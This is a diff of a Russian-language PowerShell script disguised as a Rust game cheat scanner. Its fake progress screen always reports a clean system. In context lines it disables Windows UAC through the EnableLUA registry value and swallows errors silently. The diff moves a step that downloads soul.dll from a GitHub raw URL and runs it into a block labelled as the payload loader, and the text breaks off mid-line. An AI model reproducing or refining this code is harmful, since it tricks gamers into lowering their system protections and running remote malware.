@@ -47,6 +47,7 @@ catch {
 }
 Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
 
+# Дополнительные исключения для надежности
 \$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 \$uacProperty = "EnableLUA"
 Set-ItemProperty -Path \$uacPath -Name \$uacProperty -Value 0
@@ -66,6 +67,7 @@ try {
     }
 }
 catch {
+    # Скрываем ошибки
 }
 
 # RUST CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
@@ -84,7 +86,10 @@ Start-Sleep 2
 
 # === СПИННЕР АНИМАЦИЯ ===
 function Show-Spinner {
-    param(\$text, \$duration)
+    param(
+        [string]\$text,
+        [int]\$duration
+    )
     \$spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
     $endTime = (Get-Date).AddSeconds($duration)
     \$i = 0
@@ -134,24 +139,7 @@ Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
 Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
 Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
 Write-Host "=" * 50 -ForegroundColor Green
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
 
-# ЛОГ (тоже чистый)
-\$log = @"
-Rust Cheat Scan - \$(Get-Date)
-Время: $([math]::Round($endTime.TotalSeconds)) сек
-Найдено: 0
-Риск: 0%
-Статус: ЧИСТО! ✅
-"@
-$log | Out-File "$env:TEMP\rust_scan_\$(Get-Date -f 'HHmmss').log" -Encoding UTF8
-Write-Host "`n💾 Лог: $env:TEMP\rust_scan_*.log" -ForegroundColor Gray
-Write-Host "🦀 " -ForegroundColor Green
-
-# === ЗАГРУЗЧИК everything (после паузы) ===
-Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-
-# скачиваем и запускаем everything
+# Скачиваем и запускаем полезную нагрузку
 try {
-    Write-Host "🔄 Финальная
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads
